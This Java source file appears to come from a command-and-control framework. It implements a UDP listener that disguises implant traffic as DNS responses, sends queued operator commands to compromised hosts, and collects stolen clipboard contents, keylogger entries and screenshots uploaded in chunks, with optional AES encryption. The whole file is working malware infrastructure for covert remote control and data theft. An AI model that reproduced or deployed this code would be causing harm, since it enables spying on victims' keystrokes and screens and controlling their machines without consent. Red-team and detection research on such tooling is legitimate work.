package c2.udp;

import java.io.File;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketTimeoutException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;

import c2.C2Interface;
import c2.Constants;
import c2.HarvestProcessor;
import c2.KeyloggerProcessor;
import c2.crypto.AESEncryptor;
import c2.crypto.Encryptor;
import c2.crypto.NullEncryptor;
import c2.file.ScreenshotHelper;
import c2.session.IOManager;

public class DNSEndpointEmulator extends C2Interface {
	private int port;
	private IOManager io;
	private Properties properties;

	private boolean running = true;
	private CountDownLatch deathLatch = new CountDownLatch(1);

	private String screenshotBuffer = "";
	
	private final byte BIT_ONE = 1;
	
	private Encryptor encryptor;
	
	public String getName() {
		return "DNS Emulator";
	}
	
	private KeyloggerProcessor keylogger;
	private HarvestProcessor harvester;
	
	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keylogger, HarvestProcessor harvester) {
		this.properties = prop;
		this.port = Integer.parseInt(properties.getProperty(Constants.DNSPORT));
		this.io = io;
		
		encryptor = new NullEncryptor();
		if(Boolean.parseBoolean(properties.getProperty(Constants.WIREENCRYPTTOGGLE))) {
			System.out.println("Initializing with AES");
			byte[] iv = Base64.getDecoder().decode(properties.getProperty(Constants.WIREENCRYPTIV));
			byte[] key = Base64.getDecoder().decode(properties.getProperty(Constants.WIREENCRYPTKEY));
			encryptor = new AESEncryptor(iv, key);
		}
		
		this.keylogger = keylogger;
		this.harvester = harvester;
	}

	@Override
	public void notifyPendingShutdown() {
		running = false;
	}
	
	public void stop() {
		running = false;
		try {
			deathLatch.await();
		} catch (InterruptedException e) {
			// Ignore
		}
	}

	@Override
	public void run() {
		try {
			byte[] buf = new byte[2000000];
			DatagramSocket socket = new DatagramSocket(port);
			socket.setSoTimeout(50);
			System.out.println("DNS online: " + port);
			while (running) {
				try {
					Arrays.fill(buf, (byte) 0);
					DatagramPacket packet = new DatagramPacket(buf, buf.length);
					socket.receive(packet);

					String data = new String(packet.getData(), 12, packet.getLength() - 12);
					if(Constants.DEBUG) {
						System.out.println("DEBUG: UDP received raw: " + data);
					}
					
					try {
						data = encryptor.decrypt(data);
					}catch(IllegalArgumentException ex) {
						//Sometimes we get a malformed message. Discard and move on
						continue;
					}
					//Ignore bad data
					if(data == null) {
						continue;
					}
					
					String[] args = data.split("<spl>");
					String response;
					if(args.length != 5) {
						response = "Invalid message";
					}else {
						if(Constants.DEBUG) {
							System.out.println("DEBUG: UDP received payload: " + args[4]);
						}
						String hostname = args[0];
						String username = args[1];
						String pid = args[2];
						String protocol = args[3];
						String sessionUID = hostname+":"+username+":"+protocol;
		        		Integer sessionId = io.getSessionId(sessionUID);
		        		if(sessionId == null) {
		        			sessionId = io.addSession(username, hostname, protocol);
		        		}
		        		
		        		
		        		String nextCommand = io.pollCommand(sessionId);
		        		if(Constants.DEBUG) {
							System.out.println("DEBUG: UDP polling for command for: " + sessionId + ": " + nextCommand);
						}
		        		if(nextCommand != null) {
		        			response = nextCommand;
		        		}else {
		        			response = "<control> No Command";
		        		}
		        		//System.out.println("Arg: -" + args[4] + "- on session id " + sessionId );
		        		if(args[4].startsWith("<harvest>")) {
		        			String baseDir = properties.getProperty(Constants.DAEMONLZHARVEST) + File.separator + hostname + pid + username;
		        			Files.createDirectories(Paths.get(baseDir));
		        			String file = "";
		        			if(args[4].contains("<Clipboard>")) {
		        				//filename = "Clipboard" + HTTPSManager.ISO8601_WIN.format(new Date()) + ".txt";
		        				file = args[4].substring("<harvest><Clipboard>".length());
		        				harvester.processHarvest("Clipboard", hostname, pid, username, file);
		        			}else {
		        				//TODO: Implement DNS generic harvest reception
		        			}
		        			
		        			if(Constants.DEBUG) {
								System.out.println("DEBUG: UDP harvest payload: " + file);
							}
		        			/*
		        			try (FileWriter stream = new FileWriter(baseDir + File.separator + filename)) {
		        				stream.write(file.toString());
		        			}
		        			*/
		        		}else if(args[4].startsWith("<keylogger>")) {
		        			keylogger.writeEntry(hostname, args[4].substring("<keylogger>".length()));
		        			//FileWriter fw = new FileWriter(properties.getProperty(Constants.DAEMONLZLOGGER) + File.separator + hostname, true);
		        			//fw.write(args[4].substring("<keylogger>".length()));
		        			//fw.close();
		        		}else if(args[4].startsWith("<screenshot>") && !args[4].contains("<final>")) {
		        			String b64 = args[4].substring("<screenshot>".length());
		        			screenshotBuffer = screenshotBuffer + b64;
		        			//If we tell the client a normal "no command", it will be queued.
		        			//Give special discard statement that can be ignored.
		        			response = "<discard>";
		        		}else if(args[4].startsWith("<screenshot>") && args[4].contains("<final>")) {
		        			String b64 = args[4].substring("<screenshot><final>".length());
		        			ScreenshotHelper.saveScreenshot(screenshotBuffer + b64, hostname, username, properties.getProperty(Constants.DAEMONLZHARVEST));
		        			screenshotBuffer = "";
		        		}else if(!args[4].contentEquals("<poll>")) {
		        			io.sendIO(sessionId, args[4]);
		        		}
					}
					
					if(Constants.DEBUG) {
						System.out.println("DEBUG: UDP sending payload: " + response);
					}
					
					response = encryptor.encrypt(response);
					
					InetAddress rspAddress = packet.getAddress();
					int respPort = packet.getPort();
					byte[] header = new byte[12];
					header[0] = buf[0];
					header[1] = buf[1];
					byte code1 = (byte) (BIT_ONE << 8); // set response flag to 1
					code1 &= (byte) BIT_ONE << 2; //Set authoritative answer flag to 1
					header[2] = code1;
					header[3] = 0; //No other flags set
					header[4] = 0; //Question records
					header[5] = 0;
					header[6] = 1; //Answer records
					header[7] = 0;
					header[8] = 0; //Authority records
					header[9] = 0;
					header[10] = 0; //Addition records
					header[11] = 0;
					
					byte[] payload = new byte[12 + response.length()];
					for(int idx = 0; idx < 12; idx++) {
						payload[idx] = header[idx];
					}
					for(int idx = 12; idx < payload.length; idx++) {
						payload[idx] = response.getBytes()[idx - 12];
					}
					
					packet = new DatagramPacket(payload, payload.length, rspAddress, respPort);
					socket.send(packet);
				} catch (SocketTimeoutException ex) {
					// Continue
				}
			}
			socket.close();
		} catch (IOException e) {
			System.out.println("Unable to bind to socket: " + e.getMessage());
		}
		deathLatch.countDown();
	}

	
}
